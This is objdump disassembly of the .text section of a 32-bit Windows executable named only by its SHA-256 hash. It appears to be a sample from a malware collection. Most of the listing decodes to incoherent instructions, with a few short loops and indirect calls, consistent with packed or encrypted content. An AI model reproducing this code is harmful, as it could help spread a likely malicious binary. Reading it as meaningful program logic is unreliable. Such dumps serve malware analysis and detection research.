
e295fc10d3875ce3910654e74113a0155e0c975f61181d714704a04be48066b9.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0x8ef6f18c
  40101f:	sar    DWORD PTR [esi+0x7e],0x7e
  401023:	jle    0x400fbd
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	ror    esi,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	or     al,0x80
  401036:	add    BYTE PTR [edi],cl
  401038:	xor    ecx,DWORD PTR [edi]
  40103a:	rcr    BYTE PTR [eax],0xc7
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0xf1e1b59f
  4010d2:	sub    al,0xcb
  4010d4:	sub    BYTE PTR [edx-0x5e],dh
  4010d7:	stc    
  4010d8:	pop    ebx
  4010d9:	stc    
  4010da:	mov    bl,0x5a
  4010dc:	mov    ch,0x77
  4010de:	mov    edi,0x32520203
  4010e3:	jnp    0x4010ca
  4010e5:	jno    0x401073
  4010e7:	clc    
  4010e8:	ja     0x401120
  4010ea:	pop    ebx
  4010eb:	into   
  4010ec:	mov    ecx,ebx
  4010ee:	jp     0x40116c
  4010f0:	jmp    0x9893395b
  4010f5:	mov    eax,ds:0x6ea1fc36
  4010fa:	xor    BYTE PTR [edx+0x44e8eb82],dl
  401100:	daa    
  401101:	and    ecx,DWORD PTR [eax]
  401103:	jecxz  0x401140
  401105:	adc    bh,BYTE PTR [ebp-0x65]
  401108:	ss push ebp
  40110a:	mov    dl,0xe0
  40110c:	daa    
  40110d:	fst    DWORD PTR [eax-0x25]
  401110:	cld    
  401111:	loop   0x401181
  401113:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401115:	push   edx
  401116:	sub    eax,0xae187d47
  40111b:	mov    ah,0x5b
  40111d:	imul   ebx,DWORD PTR [eax+eax*4],0xffffffb4
  401121:	add    eax,0xfb6e08e6
  401126:	adc    al,0xc7
  401128:	aad    0x55
  40112a:	or     eax,0x78218432
  40112f:	jno    0x40112f
  401131:	xor    DWORD PTR [esi+eiz*4-0x5f],eax
  401135:	sub    al,0x8c
  401137:	inc    edi
  401138:	push   ecx
  401139:	jecxz  0x4011b8
  40113b:	mov    dl,0x6e
  40113d:	pop    edi
  40113e:	adc    al,0x24
  401140:	cdq    
  401141:	push   edi
  401142:	mov    ebp,0xf628b265
  401147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401148:	jp     0x40117e
  40114a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40114b:	push   ebx
  40114c:	push   cs
  40114d:	mov    dl,0xf6
  40114f:	sub    eax,0x9b3a1f45
  401154:	xchg   ecx,eax
  401155:	enter  0xad5f,0x97
  401159:	sub    BYTE PTR [edi+ebx*4-0x45],dh
  40115d:	mov    DWORD PTR [eax],edi
  40115f:	std    
  401160:	jecxz  0x401111
  401162:	retf   0xdcdb
  401165:	pop    es
  401166:	ror    DWORD PTR [eax],cl
  401168:	adc    eax,0x4e217b85
  40116d:	xor    BYTE PTR ss:[eax+0x5f],bl
  401171:	icebp  
  401172:	jno    0x4011e5
  401174:	add    al,0x13
  401176:	jae    0x40112f
  401178:	mov    ds:0x59e1e38d,eax
  40117d:	inc    ecx
  40117e:	xlat   BYTE PTR ds:[ebx]
  40117f:	add    al,0x17
  401181:	fwait
  401182:	iret   
  401183:	inc    ebx
  401184:	xor    DWORD PTR [ebp-0x6ae17261],eax
  40118a:	jecxz  0x401162
  40118c:	sbb    DWORD PTR [bp+di],ebx
  40118f:	xor    dl,BYTE PTR [edi+0x4]
  401192:	daa    
  401193:	push   esi
  401194:	cmp    eax,0x52e32c2
  401199:	scas   eax,DWORD PTR es:[edi]
  40119a:	xchg   ebx,eax
  40119b:	push   ds
  40119c:	dec    esi
  40119d:	popf   
  40119e:	xchg   esi,eax
  40119f:	das    
  4011a0:	ret    
  4011a1:	fmul   st(1),st
  4011a3:	mov    ds:0xefa86135,eax
  4011a8:	retf   
  4011a9:	sbb    dh,BYTE PTR [edx]
  4011ab:	retf   0x15fe
  4011ae:	push   0x49
  4011b0:	popa   
  4011b1:	jmp    0x79fb3bfd
  4011b6:	rcl    eax,cl
  4011b8:	loope  0x401153
  4011ba:	add    DWORD PTR [esi],esp
  4011bc:	pop    ss
  4011bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011be:	ss mov eax,0x5a32c960
  4011c4:	loope  0x40119d
  4011c6:	mov    bl,0x15
  4011c8:	xchg   ebp,eax
  4011c9:	jle    0x40114b
  4011cb:	inc    esi
  4011cc:	iret   
  4011cd:	in     eax,0x89
  4011cf:	inc    ebp
  4011d0:	loopne 0x40118b
  4011d2:	cmp    bl,BYTE PTR [ebp+0x0]
  4011d5:	add    BYTE PTR [ebx+0x45c7e04d],cl
  4011db:	fadd   st(1),st
  4011dd:	dec    esi
  4011de:	add    BYTE PTR [eax],al
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x4303d5,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x4303d5
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x4303d5,ecx
  401209:	cmp    DWORD PTR ds:0x4303d5,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42eb8b
  401248:	cmp    DWORD PTR ds:0x4303d5,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x4303d5
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x4303d5,ecx
  401262:	cmp    DWORD PTR ds:0x4303d5,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x4303cd,0x1e
  401279:	cmp    DWORD PTR ds:0x4303cd,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x4303cd,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e927
  40129c:	mov    ecx,DWORD PTR ds:0x4303cd
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x4303cd,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx-0x144ceec0]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x40132c
  4012cc:	hlt    
  4012cd:	dec    edi
  4012ce:	mov    edi,0xa8a73e8
  4012d3:	mov    esp,DWORD PTR [ebp+0x49]
  4012d6:	hlt    
  4012d7:	mov    cl,0x45
  4012d9:	add    eax,0x5f3cc578
  4012de:	or     esi,ecx
  4012e0:	outs   dx,DWORD PTR ds:[esi]
  4012e1:	stos   DWORD PTR es:[edi],eax
  4012e2:	add    eax,0xefdc11e6
  4012e7:	cmp    bh,ch
  4012e9:	pushf  
  4012ea:	xor    eax,0xc6b0faf8
  4012ef:	inc    ebp
  4012f0:	jecxz  0x401342
  4012f2:	and    DWORD PTR [ebp+0x74d40a1f],edi
  4012f8:	mov    WORD PTR [edx+0x38516b44],cs
  4012fe:	test   eax,0x2bf3d8be
  401303:	or     al,0x79
  401305:	fmulp  st(7),st
  401307:	int3   
  401308:	test   DWORD PTR [eax],edi
  40130a:	pop    ecx
  40130b:	es jle 0x401388
  40130e:	add    eax,DWORD PTR [ecx+0x45]
  401311:	ret    0xe370
  401314:	dec    edx
  401315:	das    
  401316:	mov    ah,0x2a
  401318:	push   0xffffffa4
  40131a:	es push edx
  40131c:	dec    edx
  40131d:	mov    edx,0xa3cf8456
  401322:	cmp    DWORD PTR [ebx],ebx
  401324:	mov    al,ds:0x1bf82ee0
  401329:	xabort 0xd
  40132c:	add    DWORD PTR [edx+0x6c],eax
  40132f:	ds xchg esp,eax
  401331:	je     0x401374
  401333:	pusha  
  401334:	gs dec ebx
  401336:	out    0x20,eax
  401338:	pop    eax
  401339:	retf   
  40133a:	pop    edi
  40133b:	sbb    eax,DWORD PTR ds:0xbe89615a
  401341:	ja     0x40137f
  401343:	mov    BYTE PTR [ebp-0x65],ah
  401346:	xchg   edi,eax
  401347:	xchg   ebx,eax
  401348:	pop    ebx
  401349:	xor    al,0x13
  40134b:	and    eax,0xc44472ba
  401350:	jmp    0xa5fc:0xbabe0cb1
  401357:	mov    edi,0x41f2d4d9
  40135c:	add    esi,edx
  40135e:	int    0x7c
  401360:	lahf   
  401361:	pop    ebx
  401362:	aas    
  401363:	xor    al,0xc1
  401365:	jnp    0x401399
  401367:	setae  dl
  40136a:	scas   eax,DWORD PTR es:[edi]
  40136b:	addr16 cdq 
  40136d:	aad    0xd0
  40136f:	mov    dh,0x62
  401371:	mov    edx,0xe333a508
  401376:	pop    ds
  401377:	adc    esi,ecx
  401379:	mov    bl,0xe3
  40137b:	add    eax,0x790a7061
  401380:	mov    esp,esi
  401382:	dec    eax
  401383:	ins    DWORD PTR es:[edi],dx
  401384:	pop    ss
  401385:	mov    ebp,0x3d452c5
  40138a:	xor    BYTE PTR [esi+0x53f09738],0xb0
  401391:	mov    bl,0xf1
  401393:	add    eax,0x4db4f247
  401398:	loopne 0x401380
  40139a:	and    BYTE PTR ds:0x708076d,bl
  4013a0:	and    BYTE PTR [ecx*8-0x7ef38a3f],bl
  4013a7:	fidiv  DWORD PTR [ebp-0xf]
  4013aa:	aam    0x18
  4013ac:	ds mov cl,0x81
  4013af:	and    esp,DWORD PTR [eax+0x61]
  4013b2:	shl    BYTE PTR [ebx-0x22],1
  4013b5:	loopne 0x401432
  4013b7:	and    edi,DWORD PTR ds:0x4acc3625
  4013bd:	in     al,dx
  4013be:	mov    ecx,0xbe13598e
  4013c3:	pop    ds
  4013c4:	dec    eax
  4013c5:	mov    al,0x9c
  4013c7:	ja     0x401417
  4013c9:	call   0x3bce90f3
  4013ce:	mov    gs,WORD PTR [eax-0x7a]
  4013d1:	pop    ecx
  4013d2:	xor    al,0x66
  4013d4:	pop    ds
  4013d5:	pop    ebp
  4013d6:	xor    eax,0x480ef057
  4013db:	std    
  4013dc:	cmp    BYTE PTR [esi],al
  4013de:	push   ebp
  4013df:	mov    gs,esp
  4013e1:	mov    ?,WORD PTR [ebp*1+0xf160c64]
  4013e8:	into   
  4013e9:	inc    edi
  4013ea:	popf   
  4013eb:	(bad)  
  4013ec:	fstp   DWORD PTR [edx+ebx*1]
  4013ef:	jg     0x401382
  4013f1:	addr16 inc esi
  4013f3:	adc    DWORD PTR [edx+edi*4-0x63],ecx
  4013f7:	xor    DWORD PTR [esi+eiz*1-0x6f],ebp
  4013fb:	xchg   edi,eax
  4013fc:	jbe    0x4013bf
  4013fe:	inc    esi
  4013ff:	mov    ebp,0xd39d893e
  401404:	loopne 0x4013e9
  401406:	mov    ebp,0x1a843c3b
  40140b:	call   0xca7cbe2e
  401410:	xchg   DWORD PTR ds:0xc0e5626c,eax
  401416:	pop    es
  401417:	pop    ds
  401418:	cld    
  401419:	mov    cs,WORD PTR [eax]
  40141b:	and    bl,bl
  40141d:	push   ebp
  40141e:	(bad)  
  40141f:	mov    bh,0xac
  401421:	pop    edi
  401422:	inc    esp
  401423:	xchg   ecx,eax
  401424:	aas    
  401425:	mov    BYTE PTR [eax+esi*8-0x2f0f4f51],bl
  40142c:	jbe    0x401456
  40142e:	dec    edi
  40142f:	push   cs
  401430:	(bad)  
  401431:	sti    
  401432:	add    BYTE PTR [esi],ah
  401434:	(bad)  
  401435:	dec    esi
  401436:	out    dx,al
  401437:	jmp    0x401459
  401439:	xchg   esi,eax
  40143a:	add    DWORD PTR [ebx],esi
  40143c:	push   eax
  40143d:	xchg   DWORD PTR [edx+0x257afe57],ebp
  401443:	in     eax,0x19
  401445:	ss pop eax
  401447:	sbb    eax,0x8411133d
  40144c:	arpl   sp,bp
  40144e:	popa   
  40144f:	push   esp
  401450:	clc    
  401451:	cwde   
  401452:	popa   
  401453:	fst    QWORD PTR [eax]
  401455:	jl     0x401449
  401457:	xor    BYTE PTR fs:[eax+ebx*4+0x6d],0xa9
  40145d:	push   0x63a32ca9
  401462:	ja     0x40144a
  401464:	(bad)  
  401465:	mov    eax,ds:0x9b812189
  40146a:	sub    DWORD PTR gs:[edx],ebx
  40146d:	dec    ebp
  40146e:	sub    BYTE PTR [edx+eiz*1-0x75c346aa],0x0
  401476:	add    BYTE PTR [ecx+0x42ed5b15],al
  40147c:	add    BYTE PTR ds:0x6600002f,bh
  401482:	xor    eax,ecx
  401484:	movzx  esi,WORD PTR ds:0x4303b9
  40148b:	or     DWORD PTR ds:0x43046b,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0x1be90fff
  4014a7:	adc    bl,BYTE PTR [ebx+0x7e7e7dc2]
  4014ad:	cwde   
  4014ae:	jg     0x40152e
  4014b0:	jle    0x401530
  4014b2:	inc    ebp
  4014b3:	mov    dl,BYTE PTR [esi+ebp*4]
  4014b6:	push   ebx
  4014b7:	push   eax
  4014b8:	jg     0x401498
  4014ba:	sbb    al,0xc6
  4014bc:	pop    esp
  4014bd:	ins    DWORD PTR es:[edi],dx
  4014be:	xor    eax,0x1ea30c38
  4014c3:	out    0x7d,al
  4014c5:	aas    
  4014c6:	xchg   ebx,eax
  4014c7:	dec    esi
  4014c8:	test   DWORD PTR [ebx+0x53a808b0],eax
  4014ce:	js     0x401506
  4014d0:	jmp    0xbf639cac
  4014d5:	mov    esp,0x29c52e6b
  4014da:	(bad)  
  4014db:	call   FWORD PTR [edi]
  4014dd:	push   0x6b
  4014df:	psubb  mm4,QWORD PTR [edi-0x40]
  4014e3:	mov    ebp,0x1bd866ce
  4014e8:	clc    
  4014e9:	dec    ebx
  4014ea:	inc    edx
  4014eb:	jl     0x40156b
  4014ed:	daa    
  4014ee:	sub    ah,BYTE PTR [eax-0x5c]
  4014f1:	cmp    DWORD PTR [edx-0x58],esp
  4014f4:	fisttp DWORD PTR [eax-0x3d710e4d]
  4014fa:	mov    al,0xec
  4014fc:	mov    al,0xd4
  4014fe:	mov    esp,0xc6d6d6dd
  401503:	jns    0x4014d8
  401505:	fbstp  TBYTE PTR [eax+0x62]
  401508:	push   0x42
  40150a:	out    0xbc,eax
  40150c:	sub    DWORD PTR ds:0xa90522b0,ecx
  401512:	pushf  
  401513:	out    dx,al
  401514:	pusha  
  401515:	in     eax,0xd2
  401517:	mov    al,dl
  401519:	mov    edx,0x7ecc9f8d
  40151e:	xchg   ecx,eax
  40151f:	dec    esp
  401520:	in     al,dx
  401521:	xchg   esp,eax
  401522:	test   BYTE PTR [edx+0x6c46a707],ch
  401528:	out    dx,eax
  401529:	dec    esp
  40152a:	pop    es
  40152b:	repz fs xchg edi,eax
  40152e:	pushf  
  40152f:	inc    esi
  401530:	or     ch,BYTE PTR [ebp+0x2]
  401533:	mov    DWORD PTR [edx],ebx
  401535:	dec    esp
  401536:	pop    edi
  401537:	scas   eax,DWORD PTR es:[edi]
  401538:	pop    gs
  40153a:	ins    DWORD PTR es:[edi],dx
  40153b:	xchg   edx,eax
  40153c:	adc    al,0x1b
  40153e:	stos   BYTE PTR es:[edi],al
  40153f:	int    0xdf
  401541:	neg    BYTE PTR [edx]
  401543:	cli    
  401544:	retf   0x76bb
  401547:	arpl   si,bp
  401549:	mov    al,0xf3
  40154b:	add    BYTE PTR [ecx],bl
  40154d:	data16 jns 0x40151a
  401550:	mov    eax,0x8cc86d47
  401555:	in     eax,dx
  401556:	inc    ebx
  401557:	xor    BYTE PTR [ecx+0x23],ah
  40155a:	mov    ebp,0x2231fa82
  40155f:	jle    0x401575
  401561:	clc    
  401562:	or     edi,ebp
  401564:	cdq    
  401565:	xchg   ebx,eax
  401566:	std    
  401567:	inc    esp
  401568:	cmc    
  401569:	or     ebp,ebx
  40156b:	and    DWORD PTR [esi+ecx*4+0x2a],ecx
  40156f:	mov    edi,0x7563ab88
  401574:	or     eax,0xb935302b
  401579:	xlat   BYTE PTR ds:[ebx]
  40157a:	inc    eax
  40157b:	mov    ch,0xa
  40157d:	sub    eax,0xc1b17d52
  401582:	ret    
  401583:	jb     0xf936ee
  401589:	cmp    eax,0xafb2687f
  40158e:	adc    BYTE PTR [edx+0x5f],dh
  401591:	inc    esi
  401592:	mov    dl,0x9
  401594:	std    
  401595:	fdivr  DWORD PTR [esi]
  401597:	pop    ds
  401598:	jge    0x401580
  40159a:	pop    edx
  40159b:	xor    al,ah
  40159d:	clc    
  40159e:	pop    ebx
  40159f:	into   
  4015a0:	push   ebp
  4015a1:	int3   
  4015a2:	and    edx,DWORD PTR [edi-0x64]
  4015a5:	pop    esp
  4015a6:	dec    esi
  4015a7:	sbb    bh,BYTE PTR [edi]
  4015a9:	dec    edx
  4015aa:	fld    TBYTE PTR [ecx]
  4015ac:	icebp  
  4015ad:	jle    0x401574
  4015af:	pop    ecx
  4015b0:	test   bh,ah
  4015b2:	xor    BYTE PTR [edi+0x3cc51926],al
  4015b8:	pop    esp
  4015b9:	jl     0x4015f3
  4015bb:	cmp    edi,ebp
  4015bd:	and    al,0xa4
  4015bf:	jp     0x4015f4
  4015c1:	mov    edi,0x789280bb
  4015c6:	mov    al,0x1e
  4015c8:	mov    dl,0xf1
  4015ca:	xchg   edi,eax
  4015cb:	cli    
  4015cc:	sbb    al,BYTE PTR [ebp-0x5f9c5ccb]
  4015d2:	xchg   ebp,eax
  4015d3:	stos   BYTE PTR es:[edi],al
  4015d4:	stos   BYTE PTR es:[edi],al
  4015d5:	mov    cl,0x44
  4015d7:	(bad)  
  4015d8:	xchg   esi,eax
  4015d9:	jno    0x4015c0
  4015db:	xchg   ebx,eax
  4015dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015dd:	mov    dh,0x50
  4015df:	fcomi  st,st(5)
  4015e1:	add    BYTE PTR [ebx-0x4bea1d8d],bl
  4015e7:	pop    ds
  4015e8:	adc    al,0x82
  4015ea:	ins    BYTE PTR es:[edi],dx
  4015eb:	(bad)  
  4015ec:	and    DWORD PTR [ebp-0x35],eax
  4015ef:	jge    0x401626
  4015f1:	sub    ebp,DWORD PTR [eax-0x278c4956]
  4015f7:	mov    bh,0x5e
  4015f9:	xor    eax,DWORD PTR [ebp-0x65]
  4015fc:	mov    ch,0x76
  4015fe:	loop   0x401594
  401600:	adc    DWORD PTR [eax+eiz*1],esi
  401603:	mov    dl,0x54
  401605:	mov    ah,0x7a
  401607:	sbb    ebp,DWORD PTR [esi+0x260aa020]
  40160d:	xchg   esi,eax
  40160e:	repz fild DWORD PTR ds:0x10cd69dc
  401615:	cli    
  401616:	call   0x1748fb21
  40161b:	dec    edi
  40161c:	xor    eax,0xf25a794f
  401621:	mov    dl,0x20
  401623:	fmul   QWORD PTR [esi]
  401625:	push   esp
  401626:	lock pop es
  401628:	in     eax,0x4
  40162a:	gs js  0x4015d7
  40162d:	adc    ch,BYTE PTR [edi-0x15ff5a79]
  401633:	or     al,0x91
  401635:	(bad)  
  401636:	dec    esi
  401637:	outs   dx,BYTE PTR ds:[esi]
  401638:	call   0xdf81:0x48f90452
  40163f:	sbb    al,0xa8
  401641:	dec    eax
  401642:	push   cs
  401643:	test   ebx,esp
  401645:	stos   BYTE PTR es:[edi],al
  401646:	rcr    BYTE PTR [ebx-0xd666037],cl
  40164c:	lock nop
  40164e:	arpl   ax,di
  401650:	and    eax,0x65e75b05
  401655:	sbb    cl,BYTE PTR [edi+edx*2]
  401658:	and    esi,edi
  40165a:	jmp    0x40181d
  40165f:	push   cs
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	push   ss
  40166c:	imul   eax,DWORD PTR [esi],0x1d
  40166f:	ins    BYTE PTR es:[edi],dx
  401670:	jp     0x4016f0
  401672:	jle    0x40160c
  401674:	jg     0x4016f4
  401676:	jle    0x40169a
  401678:	adc    DWORD PTR [edx-0x61],edi
  40167b:	add    DWORD PTR gs:[ebp+0x60],eax
  40167f:	arpl   WORD PTR [ecx],di
  401681:	shl    BYTE PTR [ebx+0x1c],cl
  401684:	fcom   QWORD PTR [esi+0x1]
  401687:	push   eax
  401688:	pop    eax
  401689:	adc    al,0xec
  40168b:	jae    0x4016b2
  40168d:	sbb    edi,DWORD PTR [ecx]
  40168f:	setg   bl
  401692:	add    edi,DWORD PTR [ecx+0x62a7e9ed]
  401698:	mov    edx,0x9257d40f
  40169d:	cwde   
  40169e:	rcr    DWORD PTR [edi-0x21e1c2ec],0xc5
  4016a5:	mov    dh,0x82
  4016a7:	scas   eax,DWORD PTR es:[edi]
  4016a8:	mov    al,0x18
  4016aa:	in     eax,0xbc
  4016ac:	xor    al,0x4c
  4016ae:	rcr    DWORD PTR [ecx+0x3a6a5f56],0xb9
  4016b5:	add    BYTE PTR [ebx-0x21],dl
  4016b8:	pop    ds
  4016b9:	sbb    BYTE PTR [ebp+0x1cacd93c],al
  4016bf:	adc    eax,0xdbb920d3
  4016c4:	outs   dx,DWORD PTR ds:[esi]
  4016c5:	sbb    al,0x29
  4016c7:	daa    
  4016c8:	inc    ecx
  4016c9:	cli    
  4016ca:	mov    dl,0x8b
  4016cc:	aas    
  4016cd:	cld    
  4016ce:	jmp    0x40166f
  4016d0:	or     di,WORD PTR [ebx-0x128e408c]
  4016d7:	xor    al,0xa3
  4016d9:	test   eax,0x42d2849d
  4016de:	mov    esp,0xe89c9371
  4016e3:	les    ebx,FWORD PTR [esi-0x58]
  4016e6:	pop    edi
  4016e7:	and    DWORD PTR [edi-0x2714d75f],ebp
  4016ed:	lds    ebx,FWORD PTR [ecx+0x61c4f820]
  4016f3:	cmp    eax,0xbde6a2b2
  4016f8:	outs   dx,BYTE PTR ds:[esi]
  4016f9:	mov    edi,eax
  4016fb:	dec    ecx
  4016fc:	int    0x5b
  4016fe:	das    
  4016ff:	inc    eax
  401700:	jb     0x40169e
  401702:	inc    eax
  401703:	add    al,0x64
  401705:	js     0x4016f0
  401707:	inc    edx
  401708:	jne    0x4016a2
  40170a:	loop   0x4016b3
  40170c:	test   cl,dl
  40170e:	add    eax,0xe5a19c21
  401713:	adc    cl,al
  401715:	loop   0x40171f
  401717:	mov    edi,0xe34a7a7a
  40171c:	or     al,0xfc
  40171e:	xor    bl,al
  401720:	rcr    esi,1
  401722:	sahf   
  401723:	loope  0x4017a3
  401725:	ins    BYTE PTR es:[edi],dx
  401726:	sahf   
  401727:	adc    DWORD PTR [ebx*4-0x4f95cc42],eax
  40172e:	unpcklps xmm2,XMMWORD PTR [eax+0x5c]
  401732:	sub    edi,esp
  401734:	jae    0x401721
  401736:	loope  0x4017a1
  401738:	and    BYTE PTR [edi+ecx*8],bh
  40173b:	or     cl,BYTE PTR [edi-0x574be33f]
  401741:	inc    esi
  401742:	int    0x30
  401744:	pop    eax
  401745:	mov    esi,0x3201d207
  40174a:	cmp    edi,ebx
  40174c:	add    eax,0xd8e1e3e3
  401751:	fstp   QWORD PTR [edi]
  401753:	jns    0x4016fb
  401755:	jmp    0x4017ab
  401757:	jge    0x40175e
  401759:	dec    edi
  40175a:	push   ecx
  40175b:	inc    esp
  40175c:	fnstsw WORD PTR [edi]
  40175e:	cmc    
  40175f:	outs   dx,BYTE PTR ds:[esi]
  401760:	scas   al,BYTE PTR es:[edi]
  401761:	jnp    0x401715
  401763:	cmc    
  401764:	test   DWORD PTR [ebx+ebp*8],esi
  401767:	adc    al,bh
  401769:	test   BYTE PTR ds:0xdc74a2be,0xd1
  401770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401772:	inc    ebp
  401773:	aad    0x2
  401775:	jmp    0xb2c7:0x7ead79b
  40177c:	imul   eax,DWORD PTR [esi],0x13224a02
  401782:	(bad)  
  401784:	mov    dh,0x77
  401786:	int3   
  401787:	jle    0x4017f3
  401789:	xchg   edx,eax
  40178a:	mov    DWORD PTR [edi+edi*2+0x5f45e0ca],eax
  401791:	sub    al,0x91
  401793:	lods   eax,DWORD PTR ds:[esi]
  401794:	mov    edx,0x1d6cfcab
  401799:	or     eax,0x92e3f766
  40179e:	js     0x4017c9
  4017a0:	aas    
  4017a1:	in     al,dx
  4017a2:	and    al,0xd9
  4017a4:	int3   
  4017a5:	clc    
  4017a6:	pop    ecx
  4017a7:	or     dl,BYTE PTR [edx-0x150159db]
  4017ad:	dec    esp
  4017ae:	lods   al,BYTE PTR ds:[esi]
  4017af:	mov    bh,bl
  4017b1:	inc    ebx
  4017b2:	push   ds
  4017b3:	std    
  4017b4:	loopne 0x4017c8
  4017b6:	inc    esi
  4017b7:	ror    DWORD PTR ds:0x1488fb4b,0x5f
  4017be:	sbb    al,BYTE PTR [ebx-0x396bd803]
  4017c4:	int3   
  4017c5:	cmp    BYTE PTR [esi-0xb],cl
  4017c8:	test   eax,0x91e9a40f
  4017cd:	lods   eax,DWORD PTR ds:[esi]
  4017ce:	sub    DWORD PTR [ebp-0x9],esp
  4017d1:	enter  0xc009,0x64
  4017d5:	fistp  QWORD PTR ss:[edx]
  4017d8:	pop    ecx
  4017d9:	sub    cl,ah
  4017db:	sbb    BYTE PTR [esi+0x1c],0x39
  4017df:	(bad)  
  4017e1:	mov    ebx,0x71f58442
  4017e6:	(bad)  
  4017e7:	push   ds
  4017e8:	or     BYTE PTR [ecx-0x59],bh
  4017eb:	dec    edx
  4017ec:	adc    dh,dl
  4017ee:	popf   
  4017ef:	push   esi
  4017f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017f1:	arpl   WORD PTR ds:0x2f2f1c60,di
  4017f7:	fdivr  DWORD PTR [edx-0x5d]
  4017fa:	mov    bl,0x1c
  4017fc:	out    dx,eax
  4017fd:	add    eax,0x7fe0843d
  401802:	sbb    eax,DWORD PTR [edx-0x56]
  401805:	jb     0x4017d5
  401807:	mov    ebp,DWORD PTR [eax+0x6b]
  40180a:	mov    al,ds:0xbeb2250f
  40180f:	retf   
  401810:	pop    ebx
  401811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401812:	outs   dx,DWORD PTR ds:[esi]
  401813:	add    esi,DWORD PTR [edi-0x68d6fa83]
  401819:	mov    bh,0xb5
  40181b:	push   esp
  40181c:	pusha  
  40181d:	mov    edi,0x3b02
  401822:	add    ax,di
  401825:	mov    DWORD PTR ds:0x4303d5,0x60d8
  40182f:	movzx  eax,ax
  401832:	and    DWORD PTR ds:0x4303d9,0x0
